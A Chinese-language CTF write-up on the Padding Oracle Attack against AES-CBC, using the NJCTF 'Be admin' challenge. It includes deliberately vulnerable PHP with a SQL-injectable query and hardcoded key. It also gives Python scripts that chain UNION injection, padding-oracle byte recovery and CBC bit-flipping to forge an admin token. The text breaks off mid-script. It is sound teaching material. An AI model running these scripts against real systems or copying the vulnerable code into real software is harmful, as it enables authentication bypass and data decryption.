---
title: Padding Oracle Attack 分析
tags: [WEB漏洞]
date: 2017-05-12 21:51
---
Padding Oracle Attack是一个经典的攻击，在《白帽子讲web安全》有一章提到Padding Oracle Attack的攻击方式,本篇文章结合着NJCTF的Be admin 进行详细的讲解，扫除知识上的盲点。   本篇文章讲解的顺序是攻击原理、攻击条件、本地测试、结果分析与总结四个方面进行详细的讲解。
<!-- more -->
<link rel="stylesheet" type="text/css" href="http://static.blog.csdn.net/css/csdn_blog_detail.min.css">
<div class="markdown_views"><blockquote>
<p>Padding Oracle Attack是一个经典的攻击，在《白帽子讲web安全》有一章提到Padding Oracle Attack的攻击方式,本篇文章结合着NJCTF的Be admin 进行详细的讲解，扫除知识上的盲点。 <br>
  本篇文章讲解的顺序是攻击原理、攻击条件、本地测试、结果分析与总结四个方面进行详细的讲解。</br></p>
</blockquote>
<p><div class="toc"><div class="toc">
<ul>
<li><a href="#0x00攻击原理">0x00攻击原理</a><ul>
<li><a href="#0x1-padding">0x1 padding</a></li>
<li><a href="#0x2-cbc分组密码的链接模式">0x2 CBC分组密码的链接模式</a></li>
<li><a href="#0x3-原理总结">0x3 原理总结</a></li>
</ul>
</li>
<li><a href="#0x01-攻击条件">0x01 攻击条件</a></li>
<li><a href="#0x02-本地测试">0x02 本地测试</a><ul>
<li><a href="#0x1-在本地服务器测试代码">0x1 在本地服务器测试代码</a></li>
<li><a href="#0x2-攻击代码">0x2 攻击代码</a></li>
<li><a href="#0x3-单个检验二值的代码">0x3 单个检验二值的代码</a></li>
<li><a href="#0x4-使用cbc字节翻转">0x4 使用CBC字节翻转</a></li>
<li><a href="#0x5-任意值解密">0x5 任意值解密</a></li>
</ul>
</li>
<li><a href="#0x03-结果分析">0x03 结果分析</a></li>
</ul>
</div>
</div>
</p>
<h1 id="0x00攻击原理">0x00攻击原理</h1>
<h2 id="0x1-padding">0x1 padding</h2>
<blockquote>
<p>由于CBC是块密码工作模式, 所以要求明文长度必须是块长度的整数倍. <br>
  对于不满足的数据, 会进行数据填充到满足整数倍. 即 padding</br></p>
</blockquote>
<pre class="prettyprint"><code class=" hljs markdown"><span class="hljs-strong">** **</span> <span class="hljs-strong">** **</span> <span class="hljs-strong">** **</span> ** 01
<span class="hljs-strong">** **</span> <span class="hljs-strong">** **</span> <span class="hljs-strong">** **</span> 02 02
<span class="hljs-strong">** **</span> <span class="hljs-strong">** **</span> ** 03 03 03
<span class="hljs-strong">** **</span> <span class="hljs-strong">** **</span> 04 04 04 04
<span class="hljs-strong">** **</span> ** 05 05 05 05 05
<span class="hljs-strong">** **</span> 06 06 06 06 06 06
** 07 07 07 07 07 07 07
08 08 08 08 08 08 08 08</code></pre>
<p>即空N位就用N个\xN 进行补全 <br>
对于刚好满足明文, 则需要另补出一个块长度的数据</br></p>
<h2 id="0x2-cbc分组密码的链接模式">0x2 CBC分组密码的链接模式</h2>
<blockquote>
<p>由于此处的Padding Oracle Attack是针对CBC分组密码的链接模式来讲的因此此处再讲讲CBC</p>
</blockquote>
<p></p><center> <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170512210713313?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
CBC模式加密流程图 <br>
<center> <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170512210742593?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
CBC模式解密流程图</br></img></br></center></br></br></img></br></center><p></p>
<p>理解以上两张图以后还需要知道以下这张图中的intermediary Value的意思，意为中间值（其实就是解密操作后的值） <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170512211049286?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/></br></p>
<blockquote>
<p>明文、密文、IV、恶意明文、恶意IV 关系 <br>
  明文 = 解密(密文) XOR IV <br>
  特殊的明文 = 解密(密文) XOR 特殊IV</br></br></p>
</blockquote>
<h2 id="0x3-原理总结">0x3 原理总结</h2>
<pre><code>1. 基于密码学算法的攻击，往往第一个要搞清楚的是，我们在攻击谁，或者准确的说我们的攻击点在哪里？在一个密码学算法中，有很多的参数(指攻击者可以控制的参数)，攻击者往往是针对其中某一个或某一些参数进行破解，穷举等攻击。


在Padding Oracle Attack攻击中，攻击者输入的参数是IV+Cipher，我们要通过对IV的”穷举”来请求服务器端对我们指定的Cipher进行解密，并对返回的结果进行判断。


2. 和SQL注入中的Blind Inject思想类似。我觉得Padding Oracle Attack也是利用了这个二值逻辑的推理原理，或者说这是一种”边信道攻击(Side channel attack)”。http://en.wikipedia.org/wiki/Side_channel_attack


这种漏洞不能算是密码学算法本身的漏洞，但是当这种算法在实际生产环境中使用不当就会造成问题。


和盲注一样，这种二值逻辑的推理关键是要找到一个”区分点”，即能被攻击者用来区分这个的输入是否达到了目的(在这里就是寻找正确的IV)。


比如在web应用中，如果Padding不正确，则应用程序很可能会返回500的错误(程序执行错误)；如果Padding正确，但解密出来的内容不正确，则可能会返回200的自定义错误(这只是业务上的规定)，所以，这种区别就可以成为一个二值逻辑的”注入点”。
</code></pre>
<h1 id="0x01-攻击条件">0x01 攻击条件</h1>
<pre><code>1.可以控制密文 或者 IV
2.如果解密后不满足 padding 服务端会报错.
</code></pre>
<p>一般我们在攻击时，可以控制IV或密文的其中之一（一般是控制IV），这样我们可以通过盲注的方法把中间值注出来。 <br>
第二个条件，如果padding的结果不对就会返回False，如果正确就会返回解密的值</br></p>
<p>所以说攻击过程程就相当于盲注过程 <br>
下面会本地复现<code>Be admin</code></br></p>
<h1 id="0x02-本地测试">0x02 本地测试</h1>
<blockquote>
<p>这里直接使用NJCTF的代码</p>
</blockquote>
<p><strong>注意数据库的搭建！！！</strong></p>
<h2 id="0x1-在本地服务器测试代码">0x1 在本地服务器测试代码</h2>
<pre class="prettyprint"><code class=" hljs xml"><span class="php"><span class="hljs-preprocessor">&lt;?php</span>
error_reporting(<span class="hljs-number">0</span>);
define(<span class="hljs-string">"SECRET_KEY"</span>, <span class="hljs-string">"1234567812345678"</span>);
define(<span class="hljs-string">"METHOD"</span>, <span class="hljs-string">"aes-128-cbc"</span>);

session_start();

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_random_token</span><span class="hljs-params">()</span>{</span>
    <span class="hljs-variable">$random_token</span>=<span class="hljs-string">''</span>;
    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">16</span>;<span class="hljs-variable">$i</span>++){
        <span class="hljs-variable">$random_token</span>.=chr(rand(<span class="hljs-number">1</span>,<span class="hljs-number">255</span>));
    }
    <span class="hljs-keyword">return</span> <span class="hljs-variable">$random_token</span>;
}

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_identity</span><span class="hljs-params">()</span>
{</span>
    <span class="hljs-keyword">global</span> <span class="hljs-variable">$defaultId</span>;
    <span class="hljs-variable">$defaultId</span>=<span class="hljs-string">'action'</span>;
    <span class="hljs-variable">$j</span> = <span class="hljs-variable">$defaultId</span>;
    <span class="hljs-variable">$token</span> = get_random_token();
    <span class="hljs-variable">$c</span> = openssl_encrypt(<span class="hljs-variable">$j</span>, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, <span class="hljs-variable">$token</span> );
    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'id'</span>] = base64_encode(<span class="hljs-variable">$c</span>);
    setcookie(<span class="hljs-string">"ID"</span>, base64_encode(<span class="hljs-variable">$c</span>));
    setcookie(<span class="hljs-string">"token"</span>, base64_encode(<span class="hljs-variable">$token</span>));
    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$j</span> === <span class="hljs-string">'admin'</span>) {
        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'isadmin'</span>] = <span class="hljs-keyword">true</span>;
    } <span class="hljs-keyword">else</span> <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'isadmin'</span>] = <span class="hljs-keyword">false</span>;

}

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test_identity</span><span class="hljs-params">()</span>
{</span>
    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">"token"</span>]))
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">array</span>();
    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'id'</span>])) {
        <span class="hljs-variable">$c</span> = base64_decode(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'id'</span>]);
        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$username</span> = openssl_decrypt(<span class="hljs-variable">$c</span>, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, base64_decode(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">"token"</span>]))) {
            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$username</span> === <span class="hljs-string">'admin'</span>) {
                <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'isadmin'</span>] = <span class="hljs-keyword">true</span>;
            } <span class="hljs-keyword">else</span> <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'isadmin'</span>] = <span class="hljs-keyword">false</span>;
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-keyword">die</span>(<span class="hljs-string">"ERROR!"</span>);
        }
    }
}

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span><span class="hljs-params">(<span class="hljs-variable">$encrypted_pass</span>, <span class="hljs-variable">$pass</span>)</span>//这里是攻击的地方
{</span>
    <span class="hljs-variable">$encrypted_pass</span> = base64_decode(<span class="hljs-variable">$encrypted_pass</span>);
    <span class="hljs-variable">$iv</span> = substr(<span class="hljs-variable">$encrypted_pass</span>, <span class="hljs-number">0</span>, <span class="hljs-number">16</span>);
    <span class="hljs-variable">$cipher</span> = substr(<span class="hljs-variable">$encrypted_pass</span>, <span class="hljs-number">16</span>);
    <span class="hljs-variable">$password</span> = openssl_decrypt(<span class="hljs-variable">$cipher</span>, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, <span class="hljs-variable">$iv</span>);
    <span class="hljs-keyword">echo</span>  var_dump(<span class="hljs-variable">$password</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-variable">$password</span> == <span class="hljs-variable">$pass</span>;
}
<span class="hljs-comment">#0000000000000000</span>
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">need_login</span><span class="hljs-params">(<span class="hljs-variable">$message</span> = NULL)</span> {</span>
    <span class="hljs-keyword">echo</span> <span class="hljs-string">"   &lt;!doctype html&gt;
        &lt;html&gt;
        &lt;head&gt;
        &lt;meta charset=\"UTF-8\"&gt;
        &lt;title&gt;Login&lt;/title&gt;
        &lt;link rel=\"stylesheet\" href=\"CSS/target.css\"&gt;
            &lt;script src=\"https://cdnjs.cloudflare.com/ajax/libs/prefixfree/1.0.7/prefixfree.min.js\"&gt;&lt;/script&gt;
        &lt;/head&gt;
        &lt;body&gt;"</span>;
    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$message</span>)) {
        <span class="hljs-keyword">echo</span> <span class="hljs-string">"  &lt;div&gt;"</span> . <span class="hljs-variable">$message</span> . <span class="hljs-string">"&lt;/div&gt;\n"</span>;
    }
    <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;form method=\"POST\" action=''&gt;
            &lt;div class=\"body\"&gt;&lt;/div&gt;
                &lt;div class=\"grad\"&gt;&lt;/div&gt;
                    &lt;div class=\"header\"&gt;
                        &lt;div&gt;Log&lt;span&gt;In&lt;/span&gt;&lt;/div&gt;
                    &lt;/div&gt;
                    &lt;br&gt;
                    &lt;div class=\"login\"&gt;
                        &lt;input type=\"text\" placeholder=\"username\" name=\"username\"&gt;
                        &lt;input type=\"password\" placeholder=\"password\" name=\"password\"&gt;               
                        &lt;input type=\"submit\" value=\"Login\"&gt;
                    &lt;/div&gt;
                     &lt;script src='http://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'&gt;&lt;/script&gt;
            &lt;/form&gt;
        &lt;/body&gt;
    &lt;/html&gt;"</span>;
}
<span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;
<span class="hljs-variable">$flag</span> = <span class="hljs-string">"flag{here_is_it}"</span>;
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">show_homepage</span><span class="hljs-params">()</span> {</span>
    <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;!doctype html&gt;
&lt;html&gt;
&lt;head&gt;&lt;title&gt;Login&lt;/title&gt;&lt;/head&gt;
&lt;body&gt;"</span>;
    <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;

    printf(<span class="hljs-string">"Hello ~~~ ctfer! "</span>);
    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">"isadmin"</span>])
        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;
    <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;div&gt;&lt;a href=\"logout.php\"&gt;Log out&lt;/a&gt;&lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt;"</span>;

}

<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'username'</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'password'</span>])) {
    <span class="hljs-variable">$username</span> = (string)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'username'</span>];
    <span class="hljs-variable">$password</span> = (string)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'password'</span>];
    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$username</span>.<span class="hljs-variable">$password</span>;

    <span class="hljs-variable">$conn</span>=<span class="hljs-keyword">new</span> mysqli(<span class="hljs-string">"localhost"</span>,<span class="hljs-string">"root"</span>,<span class="hljs-string">""</span>,<span class="hljs-string">"test"</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">"有错误"</span>.mysql_error());


    <span class="hljs-variable">$query</span> = <span class="hljs-string">"SELECT username, encrypted_pass from users WHERE username='$username'"</span>;

    <span class="hljs-variable">$res</span> = <span class="hljs-variable">$conn</span>-&gt;query(<span class="hljs-variable">$query</span>) <span class="hljs-keyword">or</span> trigger_error(<span class="hljs-variable">$conn</span>-&gt;error . <span class="hljs-string">"[$query]"</span>);


    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$row</span> = <span class="hljs-variable">$res</span>-&gt;fetch_assoc())
        <span class="hljs-variable">$encrypted_pass</span> = <span class="hljs-variable">$row</span>[<span class="hljs-string">"encrypted_pass"</span>];
        <span class="hljs-comment">// echo 'P'.$encrypted_pass.'P'.var_dump($row) ;</span>


    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$row</span> &amp;&amp; login(<span class="hljs-variable">$encrypted_pass</span>, <span class="hljs-variable">$password</span>)) {
        <span class="hljs-keyword">echo</span> <span class="hljs-string">"you are in!"</span> . <span class="hljs-string">"&lt;/br&gt;"</span>;
        get_identity();
        show_homepage();
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;script&gt;alert('login failed!');&lt;/script&gt;"</span>;
        need_login(<span class="hljs-string">"Login Failed!"</span>);
    }

} <span class="hljs-keyword">else</span> {
    test_identity();
    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">"id"</span>])) {
        show_homepage();
    } <span class="hljs-keyword">else</span> {
        need_login();
    }
}</span></code></pre>
<h2 id="0x2-攻击代码">0x2 攻击代码</h2>
<pre class="prettyprint"><code class=" hljs python"><span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> base64
<span class="hljs-keyword">import</span> time
<span class="hljs-comment"># url='http://218.2.197.235:23737/'</span>
url=<span class="hljs-string">'http://127.0.0.1/2.php'</span>
N=<span class="hljs-number">16</span>
phpsession=<span class="hljs-string">""</span>
ID=<span class="hljs-string">""</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">inject1</span><span class="hljs-params">(password)</span>:</span>
    param={<span class="hljs-string">'username'</span>:<span class="hljs-string">"' union select 'action','{password}"</span>.format(password=password),<span class="hljs-string">'password'</span>:<span class="hljs-string">''</span>}
    result=requests.post(url,data=param)
    <span class="hljs-comment">#print result.content</span>
    <span class="hljs-keyword">return</span> result

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">inject_token</span><span class="hljs-params">(token)</span>:</span>
    header={<span class="hljs-string">"Cookie"</span>:<span class="hljs-string">"PHPSESSID="</span>+phpsession+<span class="hljs-string">";token="</span>+token+<span class="hljs-string">";ID="</span>+ID}
    result=requests.post(url,headers=header)
    <span class="hljs-keyword">return</span> result

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">xor</span><span class="hljs-params">(a, b)</span>:</span>
    <span class="hljs-keyword">return</span> <span class="hljs-string">""</span>.join([chr(ord(a[i])^ord(b[i%len(b)])) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(len(a))])

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">pad</span><span class="hljs-params">(string,N)</span>:</span>
    l=len(string)
    <span class="hljs-keyword">if</span> l!=N:
        <span class="hljs-keyword">return</span> string+chr(N-l)*(N-l)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">padding_oracle</span><span class="hljs-params">(N,cipher)</span>:</span>
    get=<span class="hljs-string">""</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">1</span>,N+<span class="hljs-number">1</span>):
        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">0</span>,<span class="hljs-number">256</span>):
            padding=xor(get,chr(i)*(i-<span class="hljs-number">1</span>))
            c=chr(<span class="hljs-number">0</span>)*(<span class="hljs-number">16</span>-i)+chr(j)+padding+cipher
            <span class="hljs-keyword">print</span> c.encode(<span class="hljs-string">'hex'</span>)
            result=inject1(base64.b64encode(chr(<span class="hljs-number">0</span>)*<span class="hljs-number">16</span>+c))
            <span class="hljs-keyword">if</span> <span class="hljs-string">"ctfer"</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> result.content:
                <span class="hljs-keyword">print</span> result.content,c.encode(<span class="hljs-string">'hex'</span>)
                get=chr(j^i)+get
                time.sleep(<span class="hljs-number">0.1</span>)
                <span class="hljs-keyword">break</span>
    <span class="hljs-keyword">return</span> get

session=inject1(<span class="hljs-string">"action"</span>).headers[<span class="hljs-string">'set-cookie'</span>].split(<span class="hljs-string">','</span>)
phpsession=session[<span class="hljs-number">0</span>].split(<span class="hljs-string">";"</span>)[<span class="hljs-number">0</span>][<span class="hljs-number">10</span>:]
<span class="hljs-keyword">print</span> phpsession
ID=session[<span class="hljs-number">1</span>][<span class="hljs-number">4</span>:].replace(<span class="hljs-string">"%3D"</span>,<span class="hljs-string">'='</span>).replace(<span class="hljs-string">"%2F"</span>,<span class="hljs-string">'/'</span>).replace(<span class="hljs-string">"%2B"</span>,<span class="hljs-string">'+'</span>).decode(<span class="hljs-string">'base64'</span>)
token=session[<span class="hljs-number">2</span>][<span class="hljs-number">6</span>:].replace(<span class="hljs-string">"%3D"</span>,<span class="hljs-string">'='</span>).replace(<span class="hljs-string">"%2F"</span>,<span class="hljs-string">'/'</span>).replace(<span class="hljs-string">"%2B"</span>,<span class="hljs-string">'+'</span>).decode(<span class="hljs-string">'base64'</span>)

middle=<span class="hljs-string">""</span>
middle=padding_oracle(N,ID)
<span class="hljs-keyword">print</span> <span class="hljs-string">"ID:"</span>+ID.encode(<span class="hljs-string">'base64'</span>)
<span class="hljs-keyword">print</span> <span class="hljs-string">"token:"</span>+token.encode(<span class="hljs-string">'base64'</span>)
<span class="hljs-keyword">print</span> <span class="hljs-string">"middle:"</span>+middle.encode(<span class="hljs-string">'base64'</span>)
<span class="hljs-keyword">print</span> <span class="hljs-string">"\n"</span>
<span class="hljs-keyword">if</span>(len(middle)==<span class="hljs-number">16</span>):
    plaintext=xor(middle,token);
    <span class="hljs-keyword">print</span> plaintext.encode(<span class="hljs-string">'base64'</span>)
    des=pad(<span class="hljs-string">'admin'</span>,N)
    tmp=<span class="hljs-string">""</span>
    <span class="hljs-keyword">print</span> des.encode(<span class="hljs-string">"base64"</span>)
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">16</span>):
        tmp+=chr(ord(token[i])^ord(plaintext[i])^ord(des[i]))
    <span class="hljs-keyword">print</span> tmp.encode(<span class="hljs-string">'base64'</span>)

    result=inject_token(base64.b64encode(tmp))
    <span class="hljs-keyword">print</span> result.content
    <span class="hljs-keyword">if</span> <span class="hljs-string">"flag"</span> <span class="hljs-keyword">in</span> result.content <span class="hljs-keyword">or</span> <span class="hljs-string">"NJCTF"</span> <span class="hljs-keyword">in</span> result.content <span class="hljs-keyword">or</span> <span class="hljs-string">'njctf'</span> <span class="hljs-keyword">in</span> result.content:
        input(<span class="hljs-string">"success"</span>)</code></pre>
<h2 id="0x3-单个检验二值的代码">0x3 单个检验二值的代码</h2>
<pre class="prettyprint"><code class=" hljs python"><span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> base64
<span class="hljs-keyword">import</span> time
url=<span class="hljs-string">'http://127.0.0.1/2.php'</span><span class="hljs-comment">#'http://218.2.197.235:23737/'</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">inject1</span><span class="hljs-params">(password)</span>:</span>
    param={<span class="hljs-string">'username'</span>:<span class="hljs-string">"' union select 'action','{password}"</span>.format(password=password),<span class="hljs-string">'password'</span>:<span class="hljs-string">''</span>}
    result=requests.post(url,data=param)
    <span class="hljs-comment">#print result.content</span>
    <span class="hljs-keyword">return</span> result
ID = <span class="hljs-string">'CCaTjI5AQCB8CX7kHzc8yw=='</span>.decode(<span class="hljs-string">'base64'</span>)


ss =(<span class="hljs-string">"000082da81097ea064692058165be8790826938c8e4040207c097ee41f373ccb"</span>).decode(<span class="hljs-string">'hex'</span>)<span class="hljs-comment">#000081da81097ea064692058165be8790826938c8e4040207c097ee41f373ccb</span>
result=inject1(base64.b64encode(ss))

<span class="hljs-keyword">print</span> ss
<span class="hljs-keyword">print</span> result.content</code></pre>
<h2 id="0x4-使用cbc字节翻转">0x4 使用CBC字节翻转</h2>
<pre class="prettyprint"><code class=" hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test_identity</span><span class="hljs-params">()</span>
{</span>
    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">"token"</span>]))
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">array</span>();
    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'id'</span>])) {
        <span class="hljs-variable">$c</span> = base64_decode(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'id'</span>]);
        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$username</span> = openssl_decrypt(<span class="hljs-variable">$c</span>, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, base64_decode(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">"token"</span>]))) {
            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$username</span>;    
            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$username</span> === <span class="hljs-string">'admin'</span>) {
                <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'isadmin'</span>] = <span class="hljs-keyword">true</span>;
            } <span class="hljs-keyword">else</span> <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'isadmin'</span>] = <span class="hljs-keyword">false</span>;
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-keyword">die</span>(<span class="hljs-string">"ERROR!"</span>);
        }
    }
}</code></pre>
<p>上述代码可以利用cbc字节翻转直接将密文所对应的明文转化为admin <br>
具体的脚本如下</br></p>
<pre class="prettyprint"><code class=" hljs perl"><span class="hljs-comment">#nbdRWPAEcOUhoGkPhwRTCw==</span>
<span class="hljs-comment">#action</span>
from binascii import b2a_hex, a2b_hex
from base64 import *
<span class="hljs-keyword">s</span> = b64decode(<span class="hljs-string">'nbdRWPAEcOUhoGkPhwRTCw=='</span>)
b = <span class="hljs-keyword">s</span>[<span class="hljs-number">0</span>]+<span class="hljs-keyword">chr</span>(<span class="hljs-keyword">ord</span>(<span class="hljs-string">'c'</span>)^<span class="hljs-keyword">ord</span>(<span class="hljs-keyword">s</span>[<span class="hljs-number">1</span>])^<span class="hljs-keyword">ord</span>(<span class="hljs-string">'d'</span>))+<span class="hljs-keyword">chr</span>(<span class="hljs-keyword">ord</span>(<span class="hljs-string">'t'</span>)^<span class="hljs-keyword">ord</span>(<span class="hljs-keyword">s</span>[<span class="hljs-number">2</span>])^<span class="hljs-keyword">ord</span>(<span class="hljs-string">'m'</span>))+<span class="hljs-keyword">s</span>[<span class="hljs-number">3</span>]+<span class="hljs-keyword">chr</span>(<span class="hljs-keyword">ord</span>(<span class="hljs-string">'o'</span>)^<span class="hljs-keyword">ord</span>(<span class="hljs-keyword">s</span>[<span class="hljs-number">4</span>])^<span class="hljs-keyword">ord</span>(<span class="hljs-string">'n'</span>))+<span class="hljs-keyword">chr</span>(<span class="hljs-keyword">ord</span>(<span class="hljs-string">'n'</span>)^<span class="hljs-keyword">ord</span>(<span class="hljs-keyword">s</span>[<span class="hljs-number">5</span>])^<span class="hljs-keyword">ord</span>(<span class="hljs-string">'\x0b'</span>))

<span class="hljs-keyword">for</span> i in range(<span class="hljs-number">6</span>,<span class="hljs-number">16</span>):
    b += <span class="hljs-keyword">chr</span>(<span class="hljs-keyword">ord</span>(<span class="hljs-string">'\x0a'</span>)^<span class="hljs-keyword">ord</span>(<span class="hljs-keyword">s</span>[i])^<span class="hljs-keyword">ord</span>(<span class="hljs-string">'\x0a'</span>))
<span class="hljs-keyword">print</span> b64encode(b)</code></pre>
<p>将生成的base64编码放到cookie的token中解析之后就是admin <br>
从而攻击成功 <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170620232727919?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/></br></br></p>
<h2 id="0x5-任意值解密">0x5 任意值解密</h2>
<p>2.php</p>
<pre class="prettyprint"><code class=" hljs xml"><span class="php"><span class="hljs-preprocessor">&lt;?php</span> 
error_reporting(<span class="hljs-number">0</span>);
define(<span class="hljs-string">"SECRET_KEY"</span>, <span class="hljs-string">"1234567812345678"</span>);
define(<span class="hljs-string">"METHOD"</span>, <span class="hljs-string">"aes-128-cbc"</span>);
<span class="hljs-variable">$token</span> = <span class="hljs-string">'1234567890123456'</span>;
<span class="hljs-variable">$j</span> = <span class="hljs-string">'flag{111111111}'</span>;

<span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'a'</span>]) {
    <span class="hljs-variable">$e</span> = hex2bin(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'a'</span>]);
    <span class="hljs-variable">$token</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'token'</span>];

    <span class="hljs-keyword">if</span>(openssl_decrypt(<span class="hljs-variable">$e</span>, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, <span class="hljs-variable">$token</span> ))
    {
        <span class="hljs-keyword">echo</span> <span class="hljs-string">"congratulation"</span>,openssl_decrypt(<span class="hljs-variable">$e</span>, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, <span class="hljs-variable">$token</span> );
    }
    <span class="hljs-keyword">else</span>
    {
        <span class="hljs-keyword">echo</span> <span class="hljs-string">"decrypt failed"</span>;
    }
}
<span class="hljs-keyword">else</span>
{
<span class="hljs-keyword">echo</span> openssl_encrypt(<span class="hljs-variable">$j</span>, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, <span class="hljs-variable">$token</span> );
 }

 <span class="hljs-preprocessor">?&gt;</span></span>

</code></pre>
<p>构造任意解密值，主要还是根据中间值进行计算，集成化脚本如下</p>
<pre class="prettyprint"><code class=" hljs livecodeserver"><span class="hljs-comment"># coding:utf-8</span>
import requests
<span class="hljs-built_in">from</span> Crypto.Util.<span class="hljs-built_in">number</span> import getPrime, long_to_bytes, bytes_to_long
import binascii
s = requests.session()
url = <span class="hljs-string">'http://127.0.0.1/2.php'</span>
payload = <span class="hljs-string">'11'</span>*<span class="hljs-number">16</span> <span class="hljs-comment">#try to calculate mid value</span>
<span class="hljs-keyword">token</span> = <span class="hljs-string">'00'</span>*<span class="hljs-number">16</span> <span class="hljs-comment">#use 16 rounds calc token value</span>


dic = <span class="hljs-string">'1234567890abcdef'</span>

box = []
<span class="hljs-keyword">for</span> i <span class="hljs-operator">in</span> dic:
